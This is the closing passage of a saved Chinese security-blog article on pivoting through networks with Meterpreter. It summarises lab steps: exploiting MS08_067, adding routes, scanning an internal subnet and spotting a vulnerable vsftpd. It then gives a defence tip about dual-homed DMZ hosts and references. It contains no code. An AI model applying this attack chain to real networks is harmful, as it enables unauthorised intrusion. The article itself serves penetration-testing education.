style="box-sizing: border-box;">成功利用MS08_067漏洞，获取7.7.7.20访问</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">7.继续收集信息，发现JC也有2张网卡</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">8.在7.7.7.20上添加第二个路由规则</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">9.对8.8.8.0/24网络执行ARP和NMAP扫描</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">10.在命名为SK的8.8.8.9机器上发现存在漏洞的vsftp版本</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">结束</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.34492753623188405" data-type="jpeg" data-w="690" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/25_NhAzZyJITV9m6zZd4AHpxuXpkUAxRg.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibhYEh6lBmy6ROhuhotqjjlKAgNhAzZyJITV9m6zZd4AHpxuXpkUAxRg/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;" width="690"  /></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">演示视频</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><iframe style="width:100%;max-width:100%;" class="video_iframe rich_pages" data-vidtype="1" allowfullscreen="" frameborder="0" data-ratio="1.715126050420168" data-w="864" src="https://v.qq.com/txp/iframe/player.html?vid=l03677x9ieh"></iframe></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">防御措施</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">1.从现有网络架构中清除，包含多张网卡并提供DMZ访问权限的系统</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">DMZ架构中的系统最好最好将其限制为仅能访问DMZ区</span></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;font-size:14px;line-height:34px;;color: rgb(136, 136, 136);"><strong style="color: rgb(51, 51, 51);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: justify;white-space: normal;background-color: rgb(255, 255, 255);font-size:15px;line-height:35px;;"><span style="color: rgb(136, 136, 136);font family: &quot;Lucida Grande&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, Verdana, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, STHeiti, &quot;Microsoft YaHei&quot;, &quot;WenQuanYi Zen Hei&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Noto Sans CJK SC&quot;, &quot;Source Han Sans CN&quot;, SimSun, sans-serif;white-space: pre-wrap;"><strong style="color: rgb(255, 104, 39);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;white-space: normal;"><img data-type="png" class="" data-ratio="0.109375" data-w="640" data-backw="501" data-backh="54" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/26_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="letter-spacing: 0.544px;color: rgb(51, 51, 51);font-size:17px;line-height:37px;;text-align: justify;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;visibility: visible !important;width: 639.6px !important;"  /></strong></span></strong></span></h2><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;font-size:14px;line-height:34px;;color: rgb(136, 136, 136);">参考资料</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;font-size:14px;line-height:34px;;color: rgb(136, 136, 136);">http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;font-size:14px;line-height:34px;;color: rgb(136, 136, 136);">https://www.sans.org/reading-room/whitepapers/testing/post-exploitation-metasploit-pivot-port-33909</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;font-size:14px;line-height:34px;;color: rgb(136, 136, 136);">https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/</span></p><p style="text-align: left;margin-bottom: 10px;"><span style="font-size:14px;line-height:34px;;color: rgb(178, 178, 178);">*参考来源：Pentest，FB小编鸢尾编译</span></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.3281027104136947" data-s="300,640" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/27_9kZ6Bzp6HKPIkCGYkfBsPynR63cBgg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNajxPOSFB9UFWD40tY4uCrHqy59kZ6Bzp6HKPIkCGYkfBsPynR63cBgg/640?wx_fmt=png'" data-type="png" data-w="701" style=""  /></p>
                <div class="msg_source_url"><a href="http://www.freebuf.com/articles/network/125278.html">阅读原文</a></div></div>
</div>
</body>
</html>